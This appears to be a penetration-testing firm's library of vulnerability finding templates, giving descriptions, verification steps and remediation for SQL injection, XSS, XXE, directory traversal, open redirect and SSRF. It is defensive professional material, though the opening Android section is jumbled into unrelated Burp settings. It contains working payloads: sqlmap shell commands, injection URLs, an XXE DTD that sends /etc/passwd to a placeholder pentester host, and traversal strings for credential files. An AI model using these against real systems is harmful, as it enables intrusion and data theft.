findingTemplate.description: The client application contains managed code assemblies that do not employ sufficient obfuscation to prevent decompiling or easy analysis. As a result, the managed code assemblies can be decompiled, and the source code can be recovered. The code can be used against the application and trusted resources in future attacks.
findingTemplate.businessImpact: By decompiling the application, an attacker may gain unauthorized access to sensitive information such as source code, passwords, encryption keys, and other data that could be used in future attacks.
findingTemplate.verificationInstructions:
For Android applications:

1. Download and install dex2jar

2. Copy your APK file to the extracted dex2jar zip folder.

    2. Target > Scope settings > Check Advanced Scope Control > Click Add and manually enter all the details that matches the scope of the project.

    1. Dashboard > Click the "Gear" under Live audit from Proxy > Scan configuration > New > Cookies_Headers

      2. Under Misc Insertion Point Options > Change the maximum to 1000

    2. Dashboard > Click the "Gear" under Live audit from Proxy > Scan configuration > New > NO_Cookies_Headers

      1. Under Insertion Point Types > Uncheck Cookie parameter values and HTTP Headers

      2. Under Misc Insertion Point Options > Change the maximum to 1000

Scanning Instructions:

  1. Scan a request that includes all cookies and headers used by the application using the new Cookies_Headers Audit Configuration.

  2. Scan all application pages that accept parameters with the NO_Cookies_Headers Audit Configuration.

  3. To scan a single request, right-click on a request in the Proxy tab/Repeater tab > Do active scan.

  4. You can scan multiple requests at the same time by holding Control while selecting the requests, then right-clicking, and selecting Do an active scan.

findingTemplate.name: SQL Injection
findingTemplate.description: SQL injection is a method of attack that takes advantage of input variables that have not been validated, thus allowing the manipulation of SQL queries processed by the backend database server. It is often presented in web-based forms, queries within URLs, and XML requests.
findingTemplate.businessImpact:
SQL injection may allow an attacker to extract, modify, add, or delete information from database servers, causing the confidentiality and integrity of the information stored in the database to be compromised.

Depending on the SQL implementation, the attacker may also be able to execute system commands on the affected host. In some circumstances, this provides the means to take control of the server hosting the database, leading to the complete compromise of the confidentiality, integrity, and availability of the affected host.
findingTemplate.verificationInstructions:
Verification Instructions

Use SQLMap to extract data and to prove if operating system command execution is possible. Typical use:

python sqlmap.py -u http://site/search.asp?id=1&name=2 -p id --dbms=dbtype --sql-shell

python sqlmap.py --help for all sqlmap options (such as --os-shell).

Manually test SQL injections on the affected parameters. Good injection strings include "'", ";" and "--". If the web server behaves unexpectedly (error messages, unexpected results etc.), try to create queries that get successfully executed on the server. If necessary, consult your coworkers.

A good verification for SQL injection proves data extraction, proves that injected queries were successfully executed, and/or possible command execution.

---------------------------------------------------------------------------------------------------------------------

Union Select - Example - 1

http://www.store.com/id=1+union+select+null,null,name,null+from+master..sysdatabases;--

Error Based - Example - 1

http://www.store.com/id=cast(@@version+as+int);--

Blind Example - Example -1 - Time Based

http://www.store.com/id=1';WAITFOR+DELAY+'00:00:10';--

Blind Example - Example -1 - Send Email

http://www.store.com/id=1';exec+master..sp_sendmail+'',@query='select+system_user';--

  4. Add sample injections (whole request not necessary) and show how data was enumerated

  5. Show the level of access

  • Insufficient Egress Filtering

  • Cleartext sensitive data in database

  • Excessive permissions for database user, service account, and links

findingTemplate.remediationInstructions:
Employ a layered approach to security that includes using parameterized queries when accepting user input. Strictly define the data type (for instance, a string, an alphanumeric character, etc.) that the application will accept and harden the database server to prevent data from being accessed inappropriately. Also, ensure that all data used by the application is put through a data input filter that removes potentially harmful characters. Best practice recommends the use of allowlists using regular expressions.

Disable detailed error messages that could give an attacker information about database names, table names, versions and type of databases being used. Replace the error message with a generic error asking the user to contact the IT department or send an e-mail to the web administrator.

A non-privileged service account should be used to run the database server, and the database user in use should not have administrative privileges to the database. Following the principle of least privilege when assigning permissions for the service account and database user helps limit the impact of a successful SQL injection attack.

findingTemplate.name: Cross-Site Scripting - Reflected
findingTemplate.description:
Cross-site scripting occurs when dynamically generated web pages display user input that is either improperly validated or not validated at all. This allows attackers to embed malicious script code into the generated page, which is then executed in the browser of the user viewing the page.

Cross-site scripting poses risks that include, but are not limited to, the following:

  • Users can unknowingly execute malicious scripts when viewing dynamically generated pages based on content provided by an attacker.

  • An attacker can take over a user's session before the user's session cookie expires.

  • An attacker can connect users to a malicious server of the attacker's choice.

  • An attacker who can convince a user to access a URL supplied by the attacker could cause script or HTML of the attacker's choice to be executed in the user's browser. Using this technique, an attacker can take actions with the privileges of the user who accessed the URL.
findingTemplate.businessImpact: Successful exploitation of cross-site scripting vulnerabilities allows an attacker to run arbitrary script code in the context of the affected user. This can be used to compromise the integrity of content returned by the web server to take over a user's session, redirect the user to a malicious web site, or send requests on behalf of a user. Stolen sessions can be used to take any action the affected user could within an application. Redirecting users to malicious web sites could be used to propagate malware, discredit the original web site, or trick users into disclosing sensitive information. Sending malicious requests on behalf of an affected user can make it difficult to discover the true origin of the attack.
findingTemplate.verificationInstructions:
Verification Instructions:

Attempt to exploit cross-site scripting by injecting JavaScript into application parameters (usually something like a parameter that contains <script>alert(1234)</script>). This can usually be obtained from the tool that identified the finding; cross-site scripting identification is mainly done by automated tools.

Manually verify what kind of input filtering the application does. Attempt to obfuscate injections to avoid detection by filters (see references).

Typical XSS vulnerabilities:

  • Standard <script> tag injection - <script>alert(123)</script>

  • Injection into existing JavaScript - ";alert(123);//

  • Injection into input tags - use JavaScript event trigger such as onmouseover=alert(123)

Reporting Requirements:

  1. Add screenshot of the initial page

  2. Add text based HTTP request/response of the request with XSS payload. Use a modified HTTP request block if necessary.

  3. Add screenshot of JavaScript executing in browser

Alternatives:

If you are able to add HTML tags, but not exploit XSS, add the finding for HTML Tag Injection.

If you have self-XSS, include this finding but downgrade to LOW and include details in the Description.

If the XSS source is a Cookie, and there are no other vulnerabilities that can be chained to set the cookie to the payload, this should be downgraded to Low similarly to self-XSS.
findingTemplate.remediationInstructions:
The following recommendations will help reduce the risk of cross-site scripting attacks:

  • Validate the input only contains a set of expected characters such as digits and dashes in a phone number.

  • Reject requests that fail input validation rather than attempting to fix or clean them.

  • Context-specific encoding should be applied before the data is written to the page. For example, HTML-encoding for user-submitted data reflected in HTML and JavaScript escaping for user-submitted data reflected in JavaScript.

  • Ensure that the application code on the server validates all input locations (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. Allowlisting should be used as the base validation method of user input; blocklisting can be used as an additional layer of protection.

  • Many web frameworks can provide built in methods to convert input data into correct, non-interpretable HTML. These libraries should be used to sanitize all input before displaying it to the client.

  • Consider the use of a Content-Security-Policy (CSP) which is a response header that instructs the user client on what resources to load.

findingTemplate.name: XML External Entity Injection
findingTemplate.description:
External Entities and external document type definitions allow referencing resources outside the main file into an XML document. When an XML processor recognizes a reference to an external entity to validate the document, it may include the entity's replacement text. Attacks targeting this behavior are commonly referred to as XML External Entity (XXE) attacks.

An attacker could, by including user-controlled external entity in the XML request:

  • Force the XML processor to read arbitrary files on the remote system

  • Force the XML processor to connect to external systems

  • Craft a malicious XML bomb with nested entities to consume server's resources, causing Denial of Service conditions
findingTemplate.businessImpact: Successful exploitation of the vulnerability may allow an unauthorized user to read arbitrary files on the affected system, resulting in the compromise of confidentiality. Exploitation may lead to disclosure of confidential information, as well as reveal sensitive information that can be used in further attacks against the target system.
findingTemplate.verificationInstructions:
Verification Instructions

Attempt to inject DOCTYPE definitions to XML-based requests (SOAP or RESTful). DOCTYPE must be defined before the XML body. Reference to external entity: &entity;

XXE can also be found in XML formatted GET and POST parameters and the same instructions can be followed to identify XXE. XXE is quite common in SAML tokens.

Sample:

<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE foo [<!ENTITY

test SYSTEM "http://www.test.com/test.txt"><!ELEMENT foo ANY>]>

<xml start>

..

<foo>&test;</foo>

..

<xml ends>

It is not necessary to define the element, external entity references can be used within existing elements.

If injection possible, attempt to

  • Read local files (entity reference file:///etc/passwd or c:\windows\win.ini)

  • Attempt to connect back to the pentest lab environment and capture possible NTLM handshake with responder (entity reference http://<pentestExternalIP>/test or \\<pentestExternalIP>\test on Windows systems)

If outbound connectivity, external DTD can be hosted at the pentest lab.

Sample entity injection:

<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE foo SYSTEM "http://<pentestExternalIP>/test.dtd">]>

Hosted test.dtd file content:

<!ENTITY % payload SYSTEM "file:///etc/passwd">

<!ENTITY % param1 '<!ENTITY % external SYSTEM

"http://<pentestExternalIP>/x=#%payload;">'> %param1; %external;

Invalid URL (x=#) is used to force error messages on SAX parser. It may not be necessary. Instead, file contents may be available on .216 in Apache access logs. % is used to create parameter entities; they are used inside DOCTYPE definition rather than the XML body.

Entity injection has limited file read capabilities. XML tags and ampersands in files to be read break XML parsing and thus cannot typically be read. It may be possible to read XML files if a) outbound connectivity and b) reflection point for file read is found. I have no instructions at the moment... experiment.

Reporting Requirements

  1. Add a screenshot of the original request

  2. Show the XXE injected to the request

  3. Show file content enumeration or external connection to pentest lab system

Further Testing

Test for additional findings that can be identified via XXE injection:

  • Insufficient Egress Filtering - report if HTTP or SMB connectivity to pentest lab servers (or Collaborator)

  • Cleartext passwords in files - report if file include used to gain access to cleartext credentials

  • Excessive Privileges - Service Account - report on Windows if possible to connect to \\localhost\c$\windows\win.ini

4. Sniff incoming traffic and parse Apache logs.

findingTemplate.name: Directory Traversal
findingTemplate.description: The application uses unsanitized user input to access files on the affected system. By injecting path traversal sequences into the user input it is possible to gain unauthorized access to arbitrary files on the system.
findingTemplate.businessImpact:
Successful exploitation of the directory traversal vulnerability allows an attacker to access files located on the targeted server. This may result in disclosure of sensitive information, such as user credentials, and thus result in further compromise of the affected system.

Directory traversal vulnerabilities affecting file creation functionality may allow a malicious user to create and possibly overwrite files which could compromise the confidentiality, integrity, and availability of the affected system.
findingTemplate.verificationInstructions:
Note:

This is High by default including the CVSS, however, if sensitive information can be found or acted upon, this should be upgraded to Critical along with the CVSS.

Verification Instructions

Identify parameters that appear to be used to denote files or folders on the server. Inject path traversal sequences in an attempt to determine if path traversal is possible and to escape the intended file location.

No error on vulnerable system (same as file=test.doc):

file=./test.doc

file=.\test.doc

Error on vulnerable system (file does not exist):

file=../test.doc

file=..\test.doc

Test if the application display directory listings if parameter is modified to be a folder:

file=./

file=.\

Attempt to access known files:

file=..\..\..\..\web.config

file=../../../../etc/passwd

file=../../../../etc/fstab

Additionally, on Windows systems, try UNC paths to connect to remote resources. If UNC paths are accepted, try connecting to externally available pentester controled servers.

If plain traversal sequences do not work use Burp Intruder to determine if encoded etc. path traversal sequences can be used:

  1. Send request to Intruder and mark injection point

  2. Select Fuzzing - Path Traversal template

  3. Create Payload Processing rule Match/Replace

  4. Replace {FILE} with known file (Linux/Unix or Windows)

  5. Example: Match regex: \{FILE\}

  6. Example: Replace with: etc/passwd

You can also use PWNWIKI for a list of common file paths:

  • Windows - http://pwnwiki.io/#!presence/windows/blind.md

  • Linux - http://pwnwiki.io/#!presence/linux/blind.md

Reporting Requirements

  1. Screenshot the initial page

  2. Show the normal HTTP request

  3. Show directory traversal sequence in request parameter

  4. Show access to files that are not normally accessible via the web site

Further Testing

If directory traversal vulnerabilities found, attempt to gain access to files that contain sensitive information. Potential findings:

  • Cleartext password in files

  • Insufficient egress filtering
findingTemplate.exploitInstructions: Attempt to read source code, configuration, and log files to identify password or vulnerabilities that will provide command execution on the affected system.
findingTemplate.remediationInstructions:
Ensure that all data used by the application is put through a data input filter that removes potentially harmful characters. Best practice recommends the use of allow lists using regular expressions.

A non-privileged service account should be used to run the web server. Following the principle of least privilege when assigning permissions for the service account helps limit the impact of a successful directory traversal attack.

findingTemplate.name: Parameter Based Redirection
findingTemplate.description:
It is possible to cause a user to be redirected to another URL of the attacker's choosing by manipulating a parameter.

For example, if the following example URL was sent to a user:

http://www.example.com/redirect.cgi?RedirectURL=www.PhishingWebsite.com

An attacker could obfuscate the RedirectURL parameter to make it less obvious to the user that they would be redirected to a phishing site. A URL like this could be sent to users in a phishing e-mail; since the URL contains the domain of a valid web site (www.example.com), users may be less likely to recognize it as part of a phishing attack. Were a user to click on the URL, they could be redirected to a phishing site that looks exactly like www.example.com, but is the attacker's web site. This could also be used to redirect users to web sites with malicious software embedded in the page, to exploit outdated or unpatched browsers.
findingTemplate.businessImpact: Were a user to click on a maliciously crafted link sent by an attacker, the user would be redirected to a web site of the attacker's choosing. This could aid in phishing attacks or automated exploits of outdated or unpatched browsers. Were a user to fall victim to a phishing attack, their credentials could be stolen. If a user with an outdated or unpatched browser clicked on the URL, the attacker could potentially gain complete control over the system.
findingTemplate.verificationInstructions:
Verification Instructions

Submit a URL in the parameter value to the vulnerable website. If successful, the client will be redirected to a page of the attacker's choice.

Example:

A script usually has three components:

  • The name of the script (redirect.cgi).

  • The parameter of the script (redirect.cgi?url=).

  • The value of the parameter (redirect.cgi?url=http://www.netspi.com/).

By passing a value of http://www.netspi.com to the parameter an attacker can redirect an unsuspecting user to a site of their choice.

If parameter based redirection issues are identified in POST requests, try converting POST to GET to see if the application accepts request parameters as GET parameters. Parameter based redirection in POST request is not really exploitable.

Reporting Requirements

  1. Screenshot the vulnerable page

  2. Inject arbitrary URL (typically www.netspi.com) into the parameter

  3. Show that client browser is redirected to the injected URL
findingTemplate.remediationInstructions:
The following recommendations will help reduce the risk of parameter-based redirection attacks:

  • Do not rely on the HTML meta refresh tag or HTTP redirection capabilities as a method of redirecting users to other sites specified by the user

  • Always sanitize data returned from a user or other application components before storing or processing it or presenting it back to the application user.

  • Maintain a list of valid "redirection" URLs.

  • Ensure that all characters that could be interpreted as an executable language are replaced with their corresponding HTML encoded versions.

  • Do not reference redirection URLs or alternative file paths within the browser's URL path.

  • Do not use the Referrer header (or an equivalent) as a method of authorization or authentication.

  • Inform users that they are leaving the web site with an intermediate warning page whenever the user navigates away from the affected web site.

For CA's SiteMinder:

To configure agents to help protect your resources from phishing attempts that could redirect users to a hostile website, set the following configuration parameter:

ValidTargetDomain

This parameter specifies the domains to which a credential collector is allowed to redirect users. If the domain in the URL does not match the domains set in this parameter, the redirect is denied. By default, this is disabled.

The ValidTargetDomain parameter identifies the valid domains for the target during processing. Before the user is redirected, the agent compares the values in the redirect URL against the domains in this parameter. Without this parameter, the agent redirects the user to targets in any domain. The ValidTargetDomain parameter can include multiple values, one for each valid domain.

For local agent configurations, specify an entry, one entry per line, for each domain, for example:

validtargetdomain=".xyzcompany.com"
validtargetdomain=".abccompany.com"

findingTemplate.name: Server-Side Request Forgery
findingTemplate.description: As part of the application workflow, the application established a connection to an external resource. It is possible to modify the endpoint for this resource and force the application server to attempt to access a different location.
findingTemplate.businessImpact: An attacker could potentially capture application server or endpoint credentials, or other sensitive information contained in the modified application request.
findingTemplate.verificationInstructions:
Verification Instructions:

Identify parameters or headers in the application that can be modified to force the backend servers to connect to a remote resource. Try capturing connections via HTTP, DNS or other protocols via Burp Collaborator. If outbound connectivity is allowed, attempt to connect to a NetSPI pentest servers to capture authentication handshakes (both SMB and HTTP).

Determine the correct finding to use:

Non - Host header attack

Example:

https://website/login?username=uid&password=pwd&server=xyz.net-spi.com

If you can get a reach out to a Burp Collaborator, but its not from the application IP, or it is from the application IP but is just DNS without any impact, use External Service Interaction.

If the DNS-only reach out can be weaponized, use Server-Side Request Forgery - DNS Only.

If any HTTP reach out is possible and the IP is from the client's application or infrastructure (does not need to be weaponized) use Server-Side Request Forgery.

Host Header attack nuances:

If the external domain is added to the Host Header and:

- An HTTP request is made to the domain from the client app or infrastructure, use Server-Side Request Forgery

- the request comes from an intermediate proxy or WAF and only performs DNS reach outs, it is a false positive.

- the application redirects you to the external domain, it is a false positive.

- the application uses the external domain in a variety of interactions between different systems of the website's infrastructure, such as using it as the host for password reset links in emails, use Host Header Poisoning

Reporting Requirements:

Add an explanation what causes the connection

Show the initial page

Show request with modified parameters

Show captured traffic

Report the following vulnerabilities if applicable:

Insufficient egress filtering

Tools:

Burp Collaborator

Responder

Inveigh

findingTemplate.name: Server-Side Request Forgery - DNS Only
findingTemplate.description: As part of the application workflow, the application established a connection to an external resource. It was possible to modify the endpoint for this resource and force the application server to attempt to access a different location. However, due to proper egress filtering external connections could not be established but the application performed name resolution for external sources and those DNS requests could be captured on external systems. In this situation, it will often be possible to use the relevant service to connect to other systems within the same organization, or to services available on the local loopback adapter of the application server itself.
findingTemplate.businessImpact: An attacker could potentially capture application server or endpoint credentials, or other sensitive information contained in the modified application request.
findingTemplate.verificationInstructions:
Verification Instructions

Identify parameters in the application that can be modified to force the backend servers to connect to a remote resource. Try capturing HTTP, DNS or other protocol requests with Burp Collaborator. If outbound connectivity is allowed, attempt to connect to a NetSPI pentest servers to capture authentication handshakes (both SMB and HTTP).

Sample:

https://website/login?username=uid&password=pwd&server=xyz.net-spi.com

Determine the correct finding to use:

Non - Host header attack

Example:

https://website/login?username=uid&password=pwd&server=xyz.net-spi.com

If you can get a reach out to a Burp Collaborator, but its not from the application IP, or it is from the application IP but is just DNS without any impact, use External Service Interaction.

If the DNS-only reach out can be weaponized, use Server-Side Request Forgery - DNS Only.

If any HTTP reach out is possible and the IP is from the client's application or infrastructure (does not need to be weaponized) use Server-Side Request Forgery.

Host Header nuances:

If the external domain is added to the Host Header and:

- An HTTP request is made to the domain from the client app or infrastructure, use Server-Side Request Forgery

- the request comes from an intermediate proxy or WAF and only performs DNS reach outs, it is a false positive.

- the application redirects you to the external domain, it is a false positive.

- the application uses the external domain in a variety of interactions between different systems of the website's infrastructure, such as using it as the host for password reset links in emails, use Host Header Poisoning

Reporting Requirements

  1. Add an explanation what causes the connection

  2. Add an explanation that only DNS traffic is allowed outbound but the vulnerability could be exploited to access internal systems

  3. Show the initial page

  4. Show request with modified parameters

  5. Show captured traffic
findingTemplate.remediationInstructions: Ensure sensitive endpoint information stays server-side and is not modifiable by the client. If clients must be able to control endpoint information, implement allow lists to ensure that connections can be made to approved endpoints only.

findingTemplate.name: Insufficient Input Validation
findingTemplate.description: One or more areas in the application do not perform sufficient input validation, allowing users to submit unexpected input to the application.
findingTemplate.businessImpact: Insufficient input validation may allow unexpected or invalid user input to be entered into the application. Depending on the user input, it may interfere with the application logic, cause invalid data entries, or potentially break application functionality.
findingTemplate.verificationInstructions:
Verification Instructions

Submit invalid values for parameter values. Use this finding if bad user input causes functional problems. For example, if adding invalid parameter values to user input breaks some application functionality. If actual attacks, such as XSS, can be exploited, then report those.

Reporting Requirements

  1. Show the initial page

  2. Show request with invalid input

  3. Show broken functionality

  4. Add an explanation whether the issue affects only the current user or other users as well
findingTemplate.remediationInstructions:
The following recommendations will help reduce the risk of special characters causing problems with the application behavior:

  • Perform all input validation server-side.

  • Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. Allow-listing should be used as the base validation method of user input; deny-listing can be used as an additional layer of protection.

  • Whenever possible, limit all client-supplied data to alphanumeric data. If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document.

  • Many server-side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displaying it to the client.

findingTemplate.name: Insufficient Input Validation - Client-Side Controls
findingTemplate.description: The application uses client-side input validation to ensure that the client inputs proper data to form fields. A malicious user can bypass the client-side controls and submit unexpected data to the application.
findingTemplate.businessImpact: Insufficient input validation allows unexpected user input to be submitted to the application. This may modify the application behavior or render some portions of the application unusable.
findingTemplate.verificationInstructions:
Verification Instructions

Look for client side input validation (usually JavaScript) or disabled functionality (grayed out buttons or form fields). If actual attacks, such as XSS, can be exploited, then report those. Use this finding if bad user input causes functional problems. For example, if adding invalid parameter values to user input breaks some application functionality.

Reporting Requirements

  1. Describe implemented client-side controls

  2. Show the initial page

  3. Show request with invalid input

  4. Show broken functionality

  5. Add an explanation whether the issue affects only the current user or other users as well
findingTemplate.remediationInstructions: Use client-side input validation and control only as a redundant form of input validation. Implement server-side input validation and controls that ensure any data received from users will be subject to validation even if the user disables any client-side controls.
